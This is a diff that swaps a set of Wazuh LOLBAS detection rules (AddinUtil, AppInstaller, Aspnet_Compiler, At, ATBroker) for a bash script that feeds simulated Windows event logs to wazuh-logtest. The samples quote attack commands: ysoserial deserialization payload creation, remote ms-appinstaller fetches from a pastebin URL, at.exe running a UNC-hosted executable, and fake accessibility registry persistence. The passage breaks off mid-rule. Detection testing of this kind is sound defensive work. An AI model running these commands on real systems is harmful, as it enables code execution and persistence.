@@ -1,492 +1,180 @@
-<group name="attack_lab,lolbas,windows,sysmon,">
+#!/usr/bin/env bash
+# =============================================================================
+# LOLBAS Detection Rules — wazuh-logtest Validation Script
+# 7 Techniques: AddinUtil · AppInstaller · Aspnet_Compiler · At ·
+#               ATBroker · Bash · Bitsadmin
+# Usage: bash lolbas_logtest_poc.sh
+# Each echo block simulates a realistic Wazuh agent Windows event log.
+# =============================================================================
 
-  <rule id="100100" level="0">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\AddinUtil\.exe$</field>
-    <description>LOLBAS [T1218] AddinUtil.exe process creation observed (baseline)</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
+echo "================================================================="
+echo "1. AddinUtil.exe — T1218 | Rule 100102 (level 12)"
+echo "   PoC: ysoserial payload triggered via -AddinRoot sensitive path"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe","commandLine":"AddInUtil.exe -AddinRoot:C:\\Users\\hieun\\Desktop\\temp\\","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"-","integrityLevel":"High","processId":"4444","parentProcessId":"5678","utcTime":"2026-04-13 07:00:01.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100101" level="0">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\AddinUtil\.exe$</field>
-    <description>LOLBAS [T1218] AddinUtil.exe process creation observed via Security 4688 (baseline)</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "1b. AddinUtil.exe — T1218 | Rule 100103 (level 15)"
+echo "    PoC: AddinUtil spawned calc.exe (deserialization succeeded)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\calc.exe","commandLine":"calc.exe","parentImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddinUtil.exe","parentCommandLine":"AddInUtil.exe -AddinRoot:C:\\Users\\hieun\\Desktop\\temp\\","user":"WIN-LAB01\\hieun","originalFileName":"CALC.EXE","integrityLevel":"High","processId":"6789","parentProcessId":"4444","utcTime":"2026-04-13 07:00:02.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100102" level="12">
-    <if_sid>100100,100101</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-AddinRoot:|--AddinRoot:|/AddinRoot:|-PipelineRoot:|--PipelineRoot:|/PipelineRoot:).*(?:\\temp\\|\\downloads?\\|\\public\\|\\appdata\\|\\users\\|\.)</field>
-    <description>LOLBAS [T1218] AddinUtil.exe called with sensitive -AddinRoot/-PipelineRoot path - potential deserialization attack</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "1c. AddinUtil.exe — T1218 | Rule 100108 (level 15)"
+echo "    PoC: ysoserial.exe executed to generate payload"
+echo "    Command: ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw > Addins.store"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Users\\hieun\\Desktop\\temp\\ysoserial.exe","commandLine":"ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"ysoserial.exe","integrityLevel":"High","processId":"3333","parentProcessId":"5678","utcTime":"2026-04-13 06:59:50.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100103" level="15">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\AddinUtil\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|net\.exe|net1|schtasks|at\.exe|msiexec|calc)\.exe$</field>
-    <description>LOLBAS [T1218] CRITICAL: AddinUtil.exe spawned suspicious child process - active deserialization payload execution</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100104" level="15">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.parentProcessName" type="pcre2">(?i)\\AddinUtil\.exe$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|net\.exe|net1|schtasks|at\.exe|msiexec|calc)\.exe$</field>
-    <description>LOLBAS [T1218] CRITICAL: AddinUtil.exe spawned suspicious child process via Security 4688 - active deserialization payload execution</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100105" level="13">
-    <if_sid>61605</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\AddinUtil\.exe$</field>
-    <field name="win.eventdata.destinationIsIpv6">false</field>
-    <description>LOLBAS [T1218] High: AddinUtil.exe initiated outbound network connection - unexpected for a .NET cache utility</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
-
-  <rule id="100106" level="10">
-    <if_sid>61613</if_sid>
-    <field name="win.eventdata.targetFilename" type="pcre2">(?i)Addins\.store$</field>
-    <description>LOLBAS [T1218] Suspicious: Addins.store file created - may be malicious deserialization payload for AddinUtil.exe</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
-
-  <rule id="100107" level="13">
-    <if_sid>100106</if_sid>
-    <field name="win.eventdata.targetFilename" type="pcre2">(?i)(\\temp\\|\\downloads?\\|\\public\\|\\appdata\\local\\temp|\\users\\)</field>
-    <description>LOLBAS [T1218] High: Addins.store created in sensitive/writable directory - staged for AddinUtil deserialization exploit</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
-
-  <rule id="100108" level="15">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\ysoserial(\.net)?\.exe$</field>
-    <description>LOLBAS [T1218] CRITICAL: ysoserial.exe executed - .NET deserialization gadget-chain payload generator detected</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
-
-  <rule id="100109" level="15">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\ysoserial(\.net)?\.exe$</field>
-    <description>LOLBAS [T1218] CRITICAL: ysoserial.exe executed via Security 4688 - .NET deserialization gadget-chain payload generator detected</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
-
-  <rule id="100110" level="15">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.originalFileName" type="pcre2">(?i)ysoserial(\.net)?\.exe</field>
-    <description>LOLBAS [T1218] CRITICAL: ysoserial.exe executed via renamed binary (OriginalFileName match) - evasion attempt detected</description>
-    <group>T1218,lolbas_addinutil,</group>
-    <mitre>
-      <id>T1218</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "1d. AddinUtil.exe — T1218 | Rule 100106 (level 10)"
+echo "    PoC: Addins.store file created in sensitive path"
+echo "    Command: ysoserial output redirected to Addins.store"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"11","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Users\\hieun\\Desktop\\temp\\ysoserial.exe","targetFilename":"C:\\Users\\hieun\\Desktop\\temp\\Addins.store","creationUtcTime":"2026-04-13 06:59:55.000","processId":"3333","utcTime":"2026-04-13 06:59:55.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100200" level="12">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4104$</field>
-    <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)ms-appinstaller://\?source=https?://</field>
-    <description>LOLBAS [T1105] Suspicious: ms-appinstaller:// URI with remote source found in PowerShell ScriptBlock - AppInstaller abuse via PowerShell</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "2. AppInstaller.exe — T1105 | Rule 100200 (level 12)"
+echo "   PoC: ms-appinstaller URI in PowerShell ScriptBlock"
+echo "   Command: start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","eventID":"4104","computer":"WIN-LAB01","channel":"Microsoft-Windows-PowerShell/Operational","severityValue":"WARNING"},"eventdata":{"scriptBlockText":"start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","path":"","messageNumber":"1","messageTotal":"1","scriptBlockId":"{abc-123}"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100201" level="12">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\AppInstaller\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)ms-appinstaller://.*source=https?://</field>
-    <description>LOLBAS [T1105] Suspicious: AppInstaller.exe launched with remote ms-appinstaller URI - potential MSIX payload delivery</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "2b. AppInstaller.exe — T1105 | Rule 100201 (level 12)"
+echo "    PoC: AppInstaller.exe process with ms-appinstaller URI"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.0_x64__8wekyb3d8bbwe\\AppInstaller.exe","commandLine":"AppInstaller.exe ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe /c start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw","user":"WIN-LAB01\\hieun","originalFileName":"AppInstaller.exe","integrityLevel":"Medium","processId":"7890","parentProcessId":"5678","utcTime":"2026-04-13 07:05:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100202" level="12">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\AppInstaller\.exe$</field>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)ms-appinstaller://.*source=https?://</field>
-    <description>LOLBAS [T1105] Suspicious: AppInstaller.exe launched with remote URI via Security 4688 - potential MSIX payload delivery</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-    </mitre>
-  </rule>
-
-  <rule id="100203" level="10">
-    <if_sid>61613</if_sid>
-    <field name="win.eventdata.targetFilename" type="pcre2">(?i)\\Microsoft\.DesktopAppInstaller_[0-9a-z]+\\AC\\INetCache\\.*</field>
-    <description>LOLBAS [T1105] Suspicious: File created in AppInstaller INetCache - remote content staged via ms-appinstaller protocol</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-    </mitre>
-  </rule>
-
-  <rule id="100204" level="8">
-    <if_sid>61605</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\AppInstaller\.exe$</field>
-    <description>LOLBAS [T1105] Medium: AppInstaller.exe initiated outbound network connection - monitor for non-Microsoft Store URLs</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-    </mitre>
-  </rule>
-
-  <rule id="100205" level="14">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\AppInstaller\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|schtasks)\.exe$</field>
-    <description>LOLBAS [T1105] High: AppInstaller.exe spawned suspicious child process - malicious MSIX payload execution likely</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100206" level="14">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.parentProcessName" type="pcre2">(?i)\\AppInstaller\.exe$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|schtasks)\.exe$</field>
-    <description>LOLBAS [T1105] High: AppInstaller.exe spawned suspicious child process via Security 4688 - malicious MSIX payload execution likely</description>
-    <group>T1105,lolbas_appinstaller,</group>
-    <mitre>
-      <id>T1105</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "2c. AppInstaller.exe — T1105 | Rule 100203 (level 10)"
+echo "    PoC: File created in DesktopAppInstaller INetCache"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"11","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.21.0_x64__8wekyb3d8bbwe\\AppInstaller.exe","targetFilename":"C:\\Users\\hieun\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\ABCD1234\\payload.msix","creationUtcTime":"2026-04-13 07:05:03.000","processId":"7890","utcTime":"2026-04-13 07:05:03.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100211" level="5">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\aspnet_compiler\.exe$</field>
-    <description>LOLBAS [T1127] aspnet_compiler.exe executed - rare outside developer/build environments; baseline visibility</description>
-    <group>T1127,lolbas_aspnet,</group>
-    <mitre>
-      <id>T1127</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "3. Aspnet_Compiler.exe — T1127 | Rule 100211 (level 5)"
+echo "   PoC: aspnet_compiler.exe executed (baseline)"
+echo "   Command: aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\Users\\hieun\\Desktop\\asptest\\none -u"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","commandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\Users\\hieun\\Desktop\\asptest\\none -u","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"aspnet_compiler.exe","integrityLevel":"High","processId":"5555","parentProcessId":"5678","utcTime":"2026-04-13 07:10:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100212" level="5">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\aspnet_compiler\.exe$</field>
-    <description>LOLBAS [T1127] aspnet_compiler.exe executed via Security 4688 - baseline visibility</description>
-    <group>T1127,lolbas_aspnet,</group>
-    <mitre>
-      <id>T1127</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "3b. Aspnet_Compiler.exe — T1127 | Rule 100213 (level 12)"
+echo "    PoC: aspnet_compiler -p pointing to Desktop (sensitive path)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","commandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\temp\\out -u","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"aspnet_compiler.exe","integrityLevel":"High","processId":"5556","parentProcessId":"5678","utcTime":"2026-04-13 07:10:05.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100213" level="12">
-    <if_sid>100211,100212</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-p\s+|/p\s+|--path\s+).*(?:\\temp\\|\\downloads?\\|\\public\\|\\appdata\\|\\users\\[^\\]+\\desktop)</field>
-    <description>LOLBAS [T1127] Suspicious: aspnet_compiler.exe -p flag points to sensitive writable path - potential malicious Build Provider execution</description>
-    <group>T1127,lolbas_aspnet,</group>
-    <mitre>
-      <id>T1127</id>
-    </mitre>
-  </rule>
-
-  <rule id="100214" level="14">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\aspnet_compiler\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|schtasks)\.exe$</field>
-    <description>LOLBAS [T1127] High: aspnet_compiler.exe spawned shell/LOLBin child - malicious Build Provider or code injection (AsyncRAT pattern)</description>
-    <group>T1127,lolbas_aspnet,</group>
-    <mitre>
-      <id>T1127</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100215" level="14">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.parentProcessName" type="pcre2">(?i)\\aspnet_compiler\.exe$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|wmic|schtasks)\.exe$</field>
-    <description>LOLBAS [T1127] High: aspnet_compiler.exe spawned shell/LOLBin child via Security 4688</description>
-    <group>T1127,lolbas_aspnet,</group>
-    <mitre>
-      <id>T1127</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "3c. Aspnet_Compiler.exe — T1127 | Rule 100214 (level 14)"
+echo "    PoC: aspnet_compiler spawned cmd.exe (malicious Build Provider)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\cmd.exe","commandLine":"cmd.exe /c whoami","parentImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe","parentCommandLine":"aspnet_compiler.exe -v none -p C:\\Users\\hieun\\Desktop\\asptest -f C:\\temp\\out -u","user":"WIN-LAB01\\hieun","originalFileName":"cmd.exe","integrityLevel":"High","processId":"5559","parentProcessId":"5556","utcTime":"2026-04-13 07:10:07.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100300" level="0">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\at\.exe$</field>
-    <description>LOLBAS [T1053.002] At.exe process creation observed (baseline)</description>
-    <group>T1053.002,lolbas_at,</group>
-    <mitre>
-      <id>T1053.002</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "4. At.exe — T1053.002 | Rule 100302 (level 12)"
+echo "   PoC: at.exe with /interactive flag"
+echo "   Command: at 14:44 /interactive cmd /c notepad.exe"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\at.exe","commandLine":"at 14:44 /interactive cmd /c notepad.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"at.exe","integrityLevel":"High","processId":"2222","parentProcessId":"5678","utcTime":"2026-04-13 07:15:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100301" level="0">
-    <if_sid>60103</if_sid>
-    <field name="win.system.eventID">^4688$</field>
-    <field name="win.eventdata.newProcessName" type="pcre2">(?i)\\at\.exe$</field>
-    <description>LOLBAS [T1053.002] At.exe process creation observed via Security 4688 (baseline)</description>
-    <group>T1053.002,lolbas_at,</group>
-    <mitre>
-      <id>T1053.002</id>
-    </mitre>
-  </rule>
-
-  <rule id="100302" level="12">
-    <if_sid>100300,100301</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/interactive\b</field>
-    <description>LOLBAS [T1053.002] Suspicious: At.exe called with /interactive - scheduled task will run in active desktop session (session hijack risk)</description>
-    <group>T1053.002,lolbas_at,</group>
-    <mitre>
-      <id>T1053.002</id>
-    </mitre>
-  </rule>
-
-  <rule id="100303" level="8">
-    <if_sid>100300,100301</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)\bat\.exe\b.*\b\d{1,2}:\d{2}\b</field>
-    <description>LOLBAS [T1053.002] Low: At.exe called with explicit time argument - deprecated scheduler rarely used legitimately in modern Windows</description>
-    <group>T1053.002,lolbas_at,</group>
-    <mitre>
-      <id>T1053.002</id>
-    </mitre>
-  </rule>
-
-  <rule id="100304" level="13">
-    <if_sid>100300,100301</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)\\\\[a-z0-9_\-\.]+\\.*</field>
-    <description>LOLBAS [T1053.002] High: At.exe called with UNC remote path - scheduled execution of payload from network share (lateral movement indicator)</description>
-    <group>T1053.002,lolbas_at,</group>
-    <mitre>
-      <id>T1053.002</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "4b. At.exe — T1053.002 | Rule 100304 (level 13)"
+echo "    PoC: at.exe with remote UNC path"
+echo "    Command: at \\\\127.0.0.1 14:44 cmd /c \\\\127.0.0.1\\share\\test.exe"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\at.exe","commandLine":"at \\\\127.0.0.1 14:44 cmd /c \\\\127.0.0.1\\share\\test.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"at.exe","integrityLevel":"High","processId":"2223","parentProcessId":"5678","utcTime":"2026-04-13 07:15:30.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100320" level="0">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\ATBroker\.exe$</field>
-    <description>LOLBAS [T1546.008] ATBroker.exe process creation observed (baseline)</description>
-    <group>T1546.008,T1218,lolbas_atbroker,</group>
-    <mitre>
-      <id>T1546.008</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "5. ATBroker.exe — T1546.008 | Rule 100321 (level 12)"
+echo "   PoC: atbroker /start with non-standard (fake) AT name"
+echo "   Command: ATBroker.exe /start maliciousAT"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\ATBroker.exe","commandLine":"ATBroker.exe /start maliciousAT","parentImage":"C:\\Windows\\System32\\cmd.exe","parentCommandLine":"cmd.exe","user":"WIN-LAB01\\hieun","originalFileName":"ATBroker.exe","integrityLevel":"High","processId":"3399","parentProcessId":"5678","utcTime":"2026-04-13 07:20:00.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100321" level="12">
-    <if_sid>100320</if_sid>
-    <field name="win.eventdata.commandLine" type="pcre2">(?i)/start\s+</field>
-    <field name="win.eventdata.commandLine" type="pcre2" negate="yes">(?i)/start\s+(narrator|animations|audiodescription|caretbrowsing|caretwidth|colorfiltering|cursorscheme|filterkeys|focusborderheight|focusborderwidth|highcontrast|keyboardcues|keyboardpref|magnifierpane|messageduration|minimumhitradius|mousekeys|osk|overlappedcontent|showsounds|soundsentry|stickykeys|togglekeys|windowarranging|windowtracking|windowtrackingtimeout|windowtrackingzorder)\b</field>
-    <description>LOLBAS [T1546.008] Suspicious: ATBroker.exe /start with non-standard AT name - possible fake Assistive Technology registration for persistence</description>
-    <group>T1546.008,lolbas_atbroker,</group>
-    <mitre>
-      <id>T1546.008</id>
-      <id>T1218</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "5b. ATBroker.exe — T1546.008 | Rule 100323 (level 13)"
+echo "    PoC: Registry modification — fake AT entry with StartExe=cmd.exe"
+echo "    Command (PowerShell): New-Item HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\maliciousAT"
+echo "                          Set-ItemProperty ... -Name StartExe -Value cmd.exe"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"13","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"eventType":"SetValue","image":"C:\\Windows\\System32\\reg.exe","targetObject":"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\maliciousAT\\StartExe","details":"C:\\Windows\\System32\\cmd.exe","processId":"3400","utcTime":"2026-04-13 07:19:50.000"}}}' | /var/ossec/bin/wazuh-logtest
 
-  <rule id="100322" level="14">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.parentImage" type="pcre2">(?i)\\ATBroker\.exe$</field>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|calc)\.exe$</field>
-    <description>LOLBAS [T1546.008] High: ATBroker.exe spawned unexpected child process - fake AT entry executed malicious payload</description>
-    <group>T1546.008,lolbas_atbroker,</group>
-    <mitre>
-      <id>T1546.008</id>
-      <id>T1059</id>
-    </mitre>
-  </rule>
-
-  <rule id="100323" level="13">
-    <if_sid>61615</if_sid>
-    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\(SOFTWARE\\Microsoft|Software\\Microsoft)\\Windows NT\\CurrentVersion\\Accessibility\\(ATs|Configuration)</field>
-    <description>LOLBAS [T1546.008] High: Registry modification to Accessibility ATs key - attacker may be registering fake AT for persistence or UAC bypass</description>
-    <group>T1546.008,lolbas_atbroker,</group>
-    <mitre>
-      <id>T1546.008</id>
-    </mitre>
-  </rule>
-
-  <rule id="100324" level="13">
-    <if_sid>61615</if_sid>
-    <field name="win.eventdata.targetObject" type="pcre2">(?i)\\Accessibility\\ATs\\.*\\StartExe</field>
-    <description>LOLBAS [T1546.008] High: Registry StartExe value set under Accessibility ATs - Assistive Technology executable path may be hijacked for persistence</description>
-    <group>T1546.008,lolbas_atbroker,</group>
-    <mitre>
-      <id>T1546.008</id>
-    </mitre>
-  </rule>
+echo ""
+echo "================================================================="
+echo "5c. ATBroker.exe — T1546.008 | Rule 100322 (level 14)"
+echo "    PoC: ATBroker spawned cmd.exe (fake AT executed)"
+echo "================================================================="
+echo '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1","computer":"WIN-LAB01","channel":"Microsoft-Windows-Sysmon/Operational","severityValue":"INFORMATION"},"eventdata":{"image":"C:\\Windows\\System32\\cmd.exe","commandLine":"\"C:\\Windows\\System32\\cmd.exe\"","parentImage":"C:\\Windows\\System32\\ATBroker.exe","parentCommandLine":"ATBroker.exe /start maliciousAT","user":"WIN-LAB01\\hieun","originalFileName":"cmd.exe","integrityLevel":"High","processId":"3401","parentProcessId":"3399","utcTime":"2026-04-13 07:20:03.000"}}}' | /var/ossec/bin/wazuh-logtest
 
 
-  <rule id="100330" level="3">
-    <if_sid>61603</if_sid>
-    <field name="win.eventdata.image" type="pcre2">(?i)\\bash\.exe$</field>
